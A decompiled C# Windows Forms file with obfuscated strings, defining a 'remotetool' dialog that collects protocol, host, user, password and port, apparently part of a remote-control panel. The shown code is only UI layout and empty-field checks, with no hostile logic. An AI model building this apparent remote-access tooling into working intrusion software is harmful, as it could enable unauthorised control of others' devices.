using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class remotetool : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButtonIcon _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon startbtn
	{
		[CompilerGenerated]
		get
		{
			return _startbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = startbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_startbtn = value;
			drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("protocombos")]
	internal virtual DrakeUIComboBox protocombos
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Htext")]
	internal virtual DrakeUITextBox Htext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Utext")]
	internal virtual DrakeUITextBox Utext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("passtext")]
	internal virtual DrakeUITextBox passtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("porttext")]
	internal virtual DrakeUITextBox porttext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.remotetool));
		this.Panel2 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.startbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.protocombos = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Label2 = new System.Windows.Forms.Label();
		this.Htext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.Label3 = new System.Windows.Forms.Label();
		this.Utext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.Label4 = new System.Windows.Forms.Label();
		this.passtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.Label5 = new System.Windows.Forms.Label();
		this.porttext = new DrakeUI.Framework.DrakeUITextBox();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.Panel5.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel7.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(302, 5);
		this.minibtn.Location = new System.Drawing.Point(344, 5);
		this.closbtn.Location = new System.Drawing.Point(386, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.remotesignal;
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(418, 16);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(428, 24);
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel2.Controls.Add(this.DrakeWidth_W11);
		this.Panel2.Controls.Add(this.startbtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(2, 296);
		this.Panel2.Name = EXGuarder._3C606211;
		this.Panel2.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel2.Size = new System.Drawing.Size(428, 54);
		this.Panel2.TabIndex = 40;
		this.DrakeUIButtonIcon1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 143, 142);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(191, 9);
		this.DrakeUIButtonIcon1.Name = EXGuarder._49192A78;
		this.DrakeUIButtonIcon1.Radius = 15;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(107, 36);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61453;
		this.DrakeUIButtonIcon1.SymbolSize = 18;
		this.DrakeUIButtonIcon1.TabIndex = 12;
		this.DrakeUIButtonIcon1.Text = EXGuarder._646C6303;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(298, 9);
		this.DrakeWidth_W11.Name = EXGuarder._444F471A;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(13, 36);
		this.DrakeWidth_W11.TabIndex = 11;
		this.startbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.startbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.startbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.startbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.Location = new System.Drawing.Point(311, 9);
		this.startbtn.Name = EXGuarder._4C454108;
		this.startbtn.Radius = 15;
		this.startbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.startbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.Size = new System.Drawing.Size(107, 36);
		this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.startbtn.Symbol = 61515;
		this.startbtn.SymbolSize = 18;
		this.startbtn.TabIndex = 8;
		this.startbtn.Text = EXGuarder._3E05072F;
		this.Panel3.Controls.Add(this.protocombos);
		this.Panel3.Controls.Add(this.Label1);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 62);
		this.Panel3.Name = EXGuarder._06592302;
		this.Panel3.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel3.Size = new System.Drawing.Size(428, 40);
		this.Panel3.TabIndex = 41;
		this.protocombos.Dock = System.Windows.Forms.DockStyle.Right;
		this.protocombos.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.protocombos.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.protocombos.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 9f, System.Drawing.FontStyle.Bold);
		this.protocombos.ForeColor = System.Drawing.Color.White;
		this.protocombos.Items.AddRange(new object[2]
		{
			EXGuarder._53332630,
			EXGuarder._60626A00
		});
		this.protocombos.Location = new System.Drawing.Point(280, 9);
		this.protocombos.Margin = new System.Windows.Forms.Padding(4);
		this.protocombos.MinimumSize = new System.Drawing.Size(56, 0);
		this.protocombos.Name = EXGuarder._58452C3E;
		this.protocombos.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.protocombos.Radius = 15;
		this.protocombos.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.protocombos.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.protocombos.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.protocombos.Size = new System.Drawing.Size(138, 25);
		this.protocombos.Style = DrakeUI.Framework.UIStyle.Custom;
		this.protocombos.StyleCustomMode = true;
		this.protocombos.TabIndex = 11;
		this.protocombos.Text = EXGuarder._53332630;
		this.protocombos.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Label1.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Label1.Location = new System.Drawing.Point(10, 9);
		this.Label1.Name = EXGuarder._25750B3E;
		this.Label1.Size = new System.Drawing.Size(121, 22);
		this.Label1.TabIndex = 0;
		this.Label1.Text = EXGuarder._2D2A1D6A;
		this.Panel4.Controls.Add(this.Label2);
		this.Panel4.Controls.Add(this.Htext);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(2, 102);
		this.Panel4.Name = EXGuarder._300C702F;
		this.Panel4.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel4.Size = new System.Drawing.Size(428, 45);
		this.Panel4.TabIndex = 42;
		this.Label2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label2.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Label2.Location = new System.Drawing.Point(10, 9);
		this.Label2.Name = EXGuarder._614E6B54;
		this.Label2.Size = new System.Drawing.Size(199, 27);
		this.Label2.TabIndex = 0;
		this.Label2.Text = EXGuarder._4D53541E;
		this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Htext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Htext.Dock = System.Windows.Forms.DockStyle.Right;
		this.Htext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.Htext.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Htext.ForeColor = System.Drawing.Color.White;
		this.Htext.Location = new System.Drawing.Point(209, 9);
		this.Htext.Margin = new System.Windows.Forms.Padding(4);
		this.Htext.Maximum = 2147483647.0;
		this.Htext.Minimum = -2147483648.0;
		this.Htext.Name = EXGuarder._0E4B3E59;
		this.Htext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Htext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Htext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Htext.Size = new System.Drawing.Size(209, 27);
		this.Htext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Htext.TabIndex = 1;
		this.Htext.Watermark = EXGuarder._15735839;
		this.Panel5.Controls.Add(this.Label3);
		this.Panel5.Controls.Add(this.Utext);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.Location = new System.Drawing.Point(2, 147);
		this.Panel5.Name = EXGuarder._06331A45;
		this.Panel5.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel5.Size = new System.Drawing.Size(428, 45);
		this.Panel5.TabIndex = 43;
		this.Label3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label3.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Label3.Location = new System.Drawing.Point(10, 9);
		this.Label3.Name = EXGuarder._105B7612;
		this.Label3.Size = new System.Drawing.Size(199, 27);
		this.Label3.TabIndex = 0;
		this.Label3.Text = EXGuarder._6D132E22;
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Utext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Utext.Dock = System.Windows.Forms.DockStyle.Right;
		this.Utext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.Utext.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Utext.ForeColor = System.Drawing.Color.White;
		this.Utext.Location = new System.Drawing.Point(209, 9);
		this.Utext.Margin = new System.Windows.Forms.Padding(4);
		this.Utext.Maximum = 2147483647.0;
		this.Utext.Minimum = -2147483648.0;
		this.Utext.Name = EXGuarder._355A7724;
		this.Utext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Utext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Utext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Utext.Size = new System.Drawing.Size(209, 27);
		this.Utext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Utext.TabIndex = 1;
		this.Utext.Watermark = EXGuarder._5F65171A;
		this.Panel6.Controls.Add(this.Label4);
		this.Panel6.Controls.Add(this.passtext);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel6.Location = new System.Drawing.Point(2, 192);
		this.Panel6.Name = EXGuarder._161E1C0D;
		this.Panel6.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel6.Size = new System.Drawing.Size(428, 45);
		this.Panel6.TabIndex = 44;
		this.Label4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label4.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Label4.Location = new System.Drawing.Point(10, 9);
		this.Label4.Name = EXGuarder._253D741F;
		this.Label4.Size = new System.Drawing.Size(199, 27);
		this.Label4.TabIndex = 0;
		this.Label4.Text = EXGuarder._611E1708;
		this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.passtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.passtext.Dock = System.Windows.Forms.DockStyle.Right;
		this.passtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.passtext.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.passtext.ForeColor = System.Drawing.Color.White;
		this.passtext.Location = new System.Drawing.Point(209, 9);
		this.passtext.Margin = new System.Windows.Forms.Padding(4);
		this.passtext.Maximum = 2147483647.0;
		this.passtext.Minimum = -2147483648.0;
		this.passtext.Name = EXGuarder._1B693D68;
		this.passtext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.passtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.passtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.passtext.Size = new System.Drawing.Size(209, 27);
		this.passtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.passtext.TabIndex = 1;
		this.passtext.Watermark = EXGuarder._5F65171A;
		this.Panel7.Controls.Add(this.Label5);
		this.Panel7.Controls.Add(this.porttext);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel7.Location = new System.Drawing.Point(2, 237);
		this.Panel7.Name = EXGuarder._1556724C;
		this.Panel7.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel7.Size = new System.Drawing.Size(428, 45);
		this.Panel7.TabIndex = 45;
		this.Label5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label5.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.Label5.Location = new System.Drawing.Point(10, 9);
		this.Label5.Name = EXGuarder._48104C03;
		this.Label5.Size = new System.Drawing.Size(199, 27);
		this.Label5.TabIndex = 0;
		this.Label5.Text = EXGuarder._1F4E0B78;
		this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.porttext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.porttext.Dock = System.Windows.Forms.DockStyle.Right;
		this.porttext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.porttext.Font = new System.Drawing.Font(EXGuarder._3C2C5F22, 10f);
		this.porttext.ForeColor = System.Drawing.Color.White;
		this.porttext.Location = new System.Drawing.Point(209, 9);
		this.porttext.Margin = new System.Windows.Forms.Padding(4);
		this.porttext.Maximum = 2147483647.0;
		this.porttext.Minimum = -2147483648.0;
		this.porttext.Name = EXGuarder._5D5C365A;
		this.porttext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.porttext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.porttext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.porttext.Size = new System.Drawing.Size(209, 27);
		this.porttext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.porttext.TabIndex = 1;
		this.porttext.Watermark = EXGuarder._5F65171A;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(432, 352);
		base.Controls.Add(this.Panel7);
		base.Controls.Add(this.Panel6);
		base.Controls.Add(this.Panel5);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._6416535C);
		base.Name = EXGuarder._65256F1E;
		base.ShowInTaskbar = false;
		this.Text = EXGuarder._65256F1E;
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		base.Controls.SetChildIndex(this.Panel5, 0);
		base.Controls.SetChildIndex(this.Panel6, 0);
		base.Controls.SetChildIndex(this.Panel7, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public remotetool()
	{
		InitializeComponent();
	}

	private void startbtn_Click(object sender, EventArgs e)
	{
		if (codes.StrisEmpty(Htext.Text) | codes.StrisEmpty(Utext.Text) | codes.StrisEmpty(passtext.Text) | codes.StrisEmpty(porttext.Text))
		{
			BTAlerter.infos(BTConst.enter_eml_pass);
			return;
		}
		base.DialogResult = DialogResult.OK;
		Close();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}
}
